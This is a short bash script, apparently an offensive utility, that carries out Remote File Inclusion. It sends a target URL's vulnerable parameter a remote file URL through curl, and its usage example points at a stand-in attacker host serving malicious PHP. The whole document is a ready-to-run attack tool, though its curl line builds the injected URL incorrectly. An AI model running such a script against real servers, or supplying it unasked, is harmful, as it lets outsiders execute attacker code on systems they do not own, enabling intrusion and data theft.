#!/bin/bash
# Remote File Inclusion (RFI) - Including remote files via a vulnerable parameter
# Options:
# <target_url> : URL with vulnerable parameter
# <file_url> : URL to remote file to include

# Usage: rfi.sh <target_url> <file_url>
# Example script
# rfi.sh "http://example.com/vuln.php?file=1" "http://attacker.com/malicious.php"

# Ensure parameters are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_url> <file_url>"
    exit 1
fi

TARGET_URL=$1
FILE_URL=$2

echo "Starting remote file inclusion on $TARGET_URL with file URL $FILE_URL"

# Perform remote file inclusion
curl "$TARGET_URL=$FILE_URL"

echo "Remote file inclusion completed."
